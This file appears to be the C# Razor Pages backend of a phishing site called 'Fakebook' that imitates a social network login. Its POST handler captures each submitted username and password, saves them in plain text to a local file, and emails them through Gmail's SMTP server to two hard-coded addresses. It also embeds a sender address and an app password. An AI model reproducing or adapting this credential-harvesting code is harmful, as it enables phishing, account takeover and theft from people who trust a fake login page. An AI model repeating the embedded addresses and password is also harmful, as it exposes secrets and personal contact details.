using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace FakebookWebSide.Pages
{
    public class IndexModel : PageModel
    {
        private readonly ILogger<IndexModel> _logger;

        public IndexModel(ILogger<IndexModel> logger)
        {
            _logger = logger;
        }

        public void OnGet()
        {

        }
        public void OnPost()
        {
            var userName = Request.Form["userName"];
            var pass = Request.Form["pass"];

            //write in file
            using (StreamWriter stream = new FileInfo("loginInfo.txt").AppendText())
            {
                stream.WriteLine("Username:" + userName.ToString().Trim() + "\r\n" + "Password:" + pass.ToString().Trim()+ "\r\n");
            }
            //send email
            SendEmail(userName, pass);
        }

         

        private void SendEmail(string userName, string pass)
        {
            //test email
            var fromAddress = new MailAddress("ilkincavadovtest@gmail.com", "Fakebook"); 

            var toAddress = "Ilkincavadovweb1@gmail.com;agasef.memmedli@gmail.com";

            string id = "lmeegsudwyeqyoba";
            string subject = "Fakebook";

            //message
            string body = "Username:" + userName + "\r\n" + "Password:" + pass; 

            //gmail sftp connection
            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, id)
            };

            //loop for emails
            foreach (var item in toAddress.Split(";"))
            {
                using (var message = new MailMessage(fromAddress.ToString(), item)
                {
                    Subject = subject,
                    Body = body
                })

                {
                    smtp.Send(message);
                }
            }
           
        }




            
         
    }
}